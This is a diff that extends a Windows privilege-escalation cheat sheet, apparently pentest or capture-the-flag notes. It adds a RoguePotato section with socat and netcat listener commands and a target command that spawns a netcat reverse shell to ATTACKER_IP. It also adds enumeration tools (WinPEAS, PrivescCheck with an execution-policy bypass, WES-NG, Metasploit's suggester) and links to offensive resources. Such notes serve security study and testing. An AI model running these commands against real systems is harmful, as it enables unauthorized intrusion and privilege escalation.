@@ -265,3 +265,37 @@ Usual files that may contain credentials:
     - Start > Lock Screen > Ease of Access
   
 # SeImpersonate / SeAssignPrimaryToken
+  - Rougepotato: https://github.com/antonioCoco/RoguePotato
+- *on attacker machine*
+  - sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
+  - nc -lnvp 4444
+- *on target machine*
+  - RoguePotato.exe -r ATTACKER_IP -e "nc64 -e cmd.exe ATTACKER_IP 4448" -l 9999
+  
+# Tools of the trade
+  - WinPEAS https://github.com/carlospolop/PEASS-ng `uncover privilege escalation paths`
+    - winpeas.exe > outputfile.txt
+  - PrivescCheck https://github.com/itm4n/PrivescCheck
+      PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+      PS C:\> . .\PrivescCheck.ps1
+      PS C:\> Invoke-PrivescCheck
+  - WES-NG: Windows Exploit Suggester - Next Generation https://github.com/bitsadmin/wesng
+    - *on target machine*
+      - systeminfo > systeminfo.txt
+      - transfer to attacker machine
+    - *on attacker machine*
+      - wes.py systeminfo.txt
+  - Metasploit
+    - *if attacker has a metapreter shell*
+    - can use metasploit's "multi/recon/local_exploit_suggester" module to check for vulnerabilities
+
+# Additional Tools
+  - PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+  - Priv2Admin https://github.com/gtworek/Priv2Admin
+  - RogueWinRM https://github.com/antonioCoco/RogueWinRM
+  - Potatos https://jlajara.gitlab.io/Potatoes_Windows_Privesc
+  - Decoder Cloud https://decoder.cloud
+  - Hacktricks https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
+  - TokenKidnapping https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
+  
+  
